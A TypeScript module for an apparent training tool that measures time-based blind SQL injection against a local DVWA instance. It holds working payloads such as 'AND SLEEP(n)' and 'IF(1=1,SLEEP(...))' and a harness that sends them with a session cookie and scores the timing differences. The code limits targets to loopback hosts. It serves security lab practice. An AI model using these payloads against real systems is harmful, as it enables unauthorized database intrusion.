import { performance } from "node:perf_hooks";

export type TimingConfidence = "HIGH" | "MEDIUM" | "LOW" | "INCONCLUSIVE";

export interface TimingExperimentDefinition {
  name: string;
  positivePayload: string;
  negativePayload: string;
  expectedDelayMs: number;
}

export interface TimingMeasurementSet {
  timesMs: number[];
  timeouts: number;
  errors: number;
  medianMs?: number;
  madMs?: number;
  totalSamples: number;
  timeoutRatio: number;
}

export interface TimingDifferentialAnalysis {
  confirmed: boolean;
  confidence: TimingConfidence;
  reason: string;
  deltaMs?: number;
  thresholdMs?: number;
  jitterMs?: number;
}

export interface TimingExperimentResult {
  name: string;
  expectedDelayMs: number;
  negative: TimingMeasurementSet;
  positive: TimingMeasurementSet;
  analysis: TimingDifferentialAnalysis;
}

export interface LocalTimingLabResult {
  target: string;
  samples: number;
  timeoutMs: number;
  baseline: TimingMeasurementSet;
  experiments: TimingExperimentResult[];
  confirmed: number;
  highConfidence: number;
  startedAt: string;
  completedAt: string;
}

export interface LocalTimingLabOptions {
  target: string;
  phpSessionId: string;
  securityLevel?: "low";
  samples?: number;
  timeoutMs?: number;
  delayMs?: number;
  experiments?: TimingExperimentDefinition[];
  fetchImpl?: typeof fetch;
}

type Observation =
  | { kind: "time"; elapsedMs: number }
  | { kind: "timeout" }
  | { kind: "error"; message: string };

const LOOPBACK_HOSTS = new Set(["localhost", "127.0.0.1", "::1"]);

function assertLocalTarget(value: string): URL {
  const target = new URL(value);
  if (!["http:", "https:"].includes(target.protocol))
    throw new Error("Timing lab target must use HTTP or HTTPS.");
  if (!LOOPBACK_HOSTS.has(target.hostname.toLowerCase()))
    throw new Error(
      "Timing differential lab is restricted to localhost/loopback targets.",
    );
  if (target.username || target.password || target.hash)
    throw new Error("Timing lab target cannot contain credentials or fragments.");
  return target;
}

function safeSessionId(value: string): string {
  if (
    !value ||
    value.length > 256 ||
    !/^[!#$%&'*+.^_`|~0-9A-Za-z-]+$/.test(value)
  )
    throw new Error("REAPER_LAB_PHPSESSID is missing or invalid.");
  return value;
}

function positiveInteger(
  value: number | undefined,
  fallback: number,
  label: string,
  max: number,
): number {
  const resolved = value ?? fallback;
  if (
    !Number.isSafeInteger(resolved) ||
    resolved < 1 ||
    resolved > max
  )
    throw new Error(`${label} must be between 1 and ${max}.`);
  return resolved;
}

function median(values: number[]): number | undefined {
  if (!values.length) return undefined;
  const ordered = [...values].sort((a, b) => a - b);
  const middle = Math.floor(ordered.length / 2);
  if (ordered.length % 2 === 1) return ordered[middle];
  return (ordered[middle - 1]! + ordered[middle]!) / 2;
}

function mad(values: number[], center: number | undefined): number | undefined {
  if (!values.length || center === undefined) return undefined;
  return median(values.map((value) => Math.abs(value - center)));
}

function summarize(observations: Observation[]): TimingMeasurementSet {
  const timesMs = observations
    .filter(
      (entry): entry is Extract<Observation, { kind: "time" }> =>
        entry.kind === "time",
    )
    .map((entry) => entry.elapsedMs);
  const timeouts = observations.filter((entry) => entry.kind === "timeout").length;
  const errors = observations.filter((entry) => entry.kind === "error").length;
  const medianMs = median(timesMs);
  const madMs = mad(timesMs, medianMs);
  const totalSamples = observations.length;
  return {
    timesMs,
    timeouts,
    errors,
    ...(medianMs === undefined ? {} : { medianMs }),
    ...(madMs === undefined ? {} : { madMs }),
    totalSamples,
    timeoutRatio: totalSamples ? timeouts / totalSamples : 0,
  };
}

function defaultExperiments(delayMs: number): TimingExperimentDefinition[] {
  if (delayMs % 1000 !== 0)
    throw new Error("Default DVWA timing lab delay must be a whole second.");
  const seconds = delayMs / 1000;
  return [
    {
      name: "AND SLEEP",
      positivePayload: `1' AND SLEEP(${seconds})-- `,
      negativePayload: "1' AND SLEEP(0)-- ",
      expectedDelayMs: delayMs,
    },
    {
      name: "Nested SELECT SLEEP",
      positivePayload: `1' AND (SELECT 1 FROM (SELECT SLEEP(${seconds})) a)-- `,
      negativePayload: "1' AND (SELECT 1 FROM (SELECT SLEEP(0)) a)-- ",
      expectedDelayMs: delayMs,
    },
    {
      name: "Boolean IF + SLEEP",
      positivePayload: `1' OR IF(1=1,SLEEP(${seconds}),0)-- `,
      negativePayload: `1' OR IF(1=2,SLEEP(${seconds}),0)-- `,
      expectedDelayMs: delayMs,
    },
  ];
}

function validateExperiment(
  experiment: TimingExperimentDefinition,
): TimingExperimentDefinition {
  if (
    !experiment.name.trim() ||
    experiment.name.length > 120 ||
    !experiment.positivePayload ||
    !experiment.negativePayload ||
    experiment.positivePayload.length > 1000 ||
    experiment.negativePayload.length > 1000 ||
    !Number.isSafeInteger(experiment.expectedDelayMs) ||
    experiment.expectedDelayMs < 1 ||
    experiment.expectedDelayMs > 30_000
  )
    throw new Error("Timing experiment definition is invalid.");
  return experiment;
}

async function measure(
  target: URL,
  payload: string,
  input: {
    phpSessionId: string;
    securityLevel: "low";
    timeoutMs: number;
    fetchImpl: typeof fetch;
  },
): Promise<Observation> {
  const url = new URL(target.href);
  url.searchParams.set("id", payload);
  url.searchParams.set("Submit", "Submit");

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), input.timeoutMs);
  const started = performance.now();

  try {
    let response: Response;
    try {
      response = await input.fetchImpl(url, {
        method: "GET",
        headers: {
          accept: "text/html,application/xhtml+xml",
          cookie: `PHPSESSID=${input.phpSessionId}; security=${input.securityLevel}`,
          "user-agent": "REAPER-Local-Timing-Lab/0.2.0",
        },
        redirect: "manual",
        signal: controller.signal,
      });
    } catch (error) {
      if (controller.signal.aborted) return { kind: "timeout" };
      return {
        kind: "error",
        message: error instanceof Error ? error.message.slice(0, 300) : "request failed",
      };
    }

    const elapsedMs = performance.now() - started;

    if ([301, 302, 303, 307, 308].includes(response.status))
      throw new Error(
        "DVWA redirected the request; the lab session may be expired or invalid.",
      );
    if (response.status >= 500)
      throw new Error(`DVWA returned HTTP ${response.status}.`);

    const body = await response.text();
    if (Buffer.byteLength(body, "utf8") > 1024 * 1024)
      throw new Error("DVWA response exceeded the 1 MiB lab limit.");
    if (
      !body.includes("SQL Injection") &&
      !response.url.toLowerCase().includes("sqli")
    )
      throw new Error(
        "Unexpected DVWA response; the request may have fallen back to login.",
      );

    return { kind: "time", elapsedMs };
  } finally {
    clearTimeout(timeout);
  }
}

async function collect(
  target: URL,
  payload: string,
  samples: number,
  request: Parameters<typeof measure>[2],
): Promise<TimingMeasurementSet> {
  const observations: Observation[] = [];
  for (let index = 0; index < samples; index++)
    observations.push(await measure(target, payload, request));
  return summarize(observations);
}

async function collectPair(
  target: URL,
  experiment: TimingExperimentDefinition,
  samples: number,
  request: Parameters<typeof measure>[2],
): Promise<{
  negative: TimingMeasurementSet;
  positive: TimingMeasurementSet;
}> {
  const negative: Observation[] = [];
  const positive: Observation[] = [];

  for (let index = 0; index < samples; index++) {
    if (index % 2 === 0) {
      negative.push(await measure(target, experiment.negativePayload, request));
      positive.push(await measure(target, experiment.positivePayload, request));
    } else {
      positive.push(await measure(target, experiment.positivePayload, request));
      negative.push(await measure(target, experiment.negativePayload, request));
    }
  }

  return {
    negative: summarize(negative),
    positive: summarize(positive),
  };
}

export function analyzeTimingDifferential(input: {
  baseline: TimingMeasurementSet;
  negative: TimingMeasurementSet;
  positive: TimingMeasurementSet;
  expectedDelayMs: number;
}): TimingDifferentialAnalysis {
  if (
    input.positive.timeoutRatio >= 0.6 &&
    input.negative.timeoutRatio === 0
  )
    return {
      confirmed: true,
      confidence: "HIGH",
      reason:
        "positive control repeatedly exceeded the timeout while the negative control completed normally",
    };

  const baselineMedian = input.baseline.medianMs;
  const negativeMedian = input.negative.medianMs;
  const positiveMedian = input.positive.medianMs;

  if (
    baselineMedian === undefined ||
    negativeMedian === undefined ||
    positiveMedian === undefined
  )
    return {
      confirmed: false,
      confidence: "INCONCLUSIVE",
      reason: "insufficient successful samples for a differential comparison",
    };

  const deltaMs = positiveMedian - negativeMedian;
  const jitterMs = Math.max(
    input.baseline.madMs ?? 0,
    input.negative.madMs ?? 0,
  );
  const thresholdMs = Math.max(input.expectedDelayMs * 0.8, jitterMs * 6, 500);
  const confirmed = deltaMs >= thresholdMs;

  if (!confirmed)
    return {
      confirmed: false,
      confidence: "LOW",
      reason: "observed timing differential did not exceed the evidence threshold",
      deltaMs,
      thresholdMs,
      jitterMs,
    };

  return {
    confirmed: true,
    confidence:
      jitterMs < 250 && deltaMs >= input.expectedDelayMs * 0.9
        ? "HIGH"
        : "MEDIUM",
    reason:
      "positive/negative timing differential is consistent with the expected delay",
    deltaMs,
    thresholdMs,
    jitterMs,
  };
}

export async function runLocalTimingDifferentialLab(
  options: LocalTimingLabOptions,
): Promise<LocalTimingLabResult> {
  const target = assertLocalTarget(options.target);
  const phpSessionId = safeSessionId(options.phpSessionId);
  const securityLevel = options.securityLevel ?? "low";
  if (securityLevel !== "low")
    throw new Error("DVWA timing lab currently supports security level low only.");

  const samples = positiveInteger(options.samples, 5, "samples", 20);
  const delayMs = positiveInteger(options.delayMs, 5000, "delayMs", 30_000);
  const timeoutMs = positiveInteger(
    options.timeoutMs,
    delayMs + 5000,
    "timeoutMs",
    60_000,
  );
  if (timeoutMs <= delayMs)
    throw new Error("timeoutMs must be greater than the expected delay.");

  const experiments = (options.experiments ?? defaultExperiments(delayMs)).map(
    validateExperiment,
  );
  if (!experiments.length || experiments.length > 20)
    throw new Error("Timing lab requires 1 to 20 experiments.");

  const startedAt = new Date().toISOString();
  const request = {
    phpSessionId,
    securityLevel,
    timeoutMs,
    fetchImpl: options.fetchImpl ?? fetch,
  };

  const baseline = await collect(target, "1", samples, request);
  if (baseline.medianMs === undefined)
    throw new Error("Timing lab could not establish a baseline.");

  const results: TimingExperimentResult[] = [];
  for (const experiment of experiments) {
    const pair = await collectPair(target, experiment, samples, request);
    results.push({
      name: experiment.name,
      expectedDelayMs: experiment.expectedDelayMs,
      ...pair,
      analysis: analyzeTimingDifferential({
        baseline,
        negative: pair.negative,
        positive: pair.positive,
        expectedDelayMs: experiment.expectedDelayMs,
      }),
    });
  }

  return {
    target: target.href,
    samples,
    timeoutMs,
    baseline,
    experiments: results,
    confirmed: results.filter((entry) => entry.analysis.confirmed).length,
    highConfidence: results.filter(
      (entry) =>
        entry.analysis.confirmed && entry.analysis.confidence === "HIGH",
    ).length,
    startedAt,
    completedAt: new Date().toISOString(),
  };
}

function seconds(value: number | undefined): string {
  return value === undefined ? "n/a" : `${(value / 1000).toFixed(3)}s`;
}

export function renderTimingLab(result: LocalTimingLabResult): string {
  const lines = [
    "REAPER LOCAL TIMING DIFFERENTIAL LAB",
    `Target: ${result.target}`,
    `Samples: ${result.samples} | Timeout: ${seconds(result.timeoutMs)}`,
    "",
    `baseline   median=${seconds(result.baseline.medianMs)} MAD=${seconds(result.baseline.madMs)} timeouts=${result.baseline.timeouts}/${result.baseline.totalSamples}`,
  ];

  for (const experiment of result.experiments) {
    lines.push(
      "",
      `[${experiment.name}]`,
      `negative   median=${seconds(experiment.negative.medianMs)} MAD=${seconds(experiment.negative.madMs)} timeouts=${experiment.negative.timeouts}/${experiment.negative.totalSamples}`,
      `positive   median=${seconds(experiment.positive.medianMs)} MAD=${seconds(experiment.positive.madMs)} timeouts=${experiment.positive.timeouts}/${experiment.positive.totalSamples}`,
    );
    if (experiment.analysis.deltaMs !== undefined)
      lines.push(
        `delta      ${seconds(experiment.analysis.deltaMs)} | threshold=${seconds(experiment.analysis.thresholdMs)} | jitter=${seconds(experiment.analysis.jitterMs)}`,
      );
    lines.push(
      `${experiment.analysis.confirmed ? "[!]" : "[ ]"} confidence=${experiment.analysis.confidence} — ${experiment.analysis.reason}`,
    );
  }

  lines.push(
    "",
    `Confirmed: ${result.confirmed}/${result.experiments.length}`,
    `HIGH confidence: ${result.highConfidence}/${result.experiments.length}`,
    "",
  );
  return lines.join("\n");
}
